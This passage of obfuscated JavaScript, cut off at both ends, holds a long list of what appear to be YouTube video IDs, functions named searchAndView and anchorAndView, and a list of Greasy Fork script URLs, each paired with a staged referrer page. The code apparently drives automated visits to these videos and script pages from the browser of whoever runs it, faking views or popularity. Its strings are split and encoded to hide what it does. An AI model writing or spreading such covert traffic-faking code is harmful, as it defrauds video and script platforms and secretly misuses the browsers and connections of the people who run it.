    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    W(0xb) + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    W(0x1a) + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    X(0x10, '%Yo*') + 'I',
    'sVy9F4whP6' + 'o',
    W(0xa) + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': X(0x17, 'nf9b') + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': V(0x1d) + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + V(0x0) + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': V(0x1d) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x8) + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + X(0x1, '0Gb6'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + X(0x5, '1X*G') + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
